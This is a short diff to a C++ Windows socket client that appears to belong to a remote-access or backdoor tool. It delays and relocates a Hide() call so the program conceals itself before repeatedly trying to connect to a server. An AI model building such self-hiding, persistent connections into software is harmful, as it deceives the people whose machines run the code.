@@ -1,4 +1,6 @@
 #include <iostream>
+#include <thread>
+#include <chrono>
 #include <string>
 #include "client-clean.h"
 
@@ -7,8 +9,6 @@ SOCKET sock;
 WSADATA wsa;
 
 int main(int argc, char const *argv[]) {
-	Hide();
-
 	if (WSAStartup(MAKEWORD(2, 2), &wsa) != 0) {
 	    printf("Failed. Error Code: %d\n", WSAGetLastError());
 	    return 0;
@@ -57,6 +57,9 @@ int main(int argc, char const *argv[]) {
 
 	// connect to the server
 	std::cout << "[+] Connecting now to the server.\n";
+	std::this_thread::sleep_for(std::chrono::seconds(3));
+	Hide();
+
 	bool is_connected = false;
 	int attempts = 0;
 	while (!is_connected) {
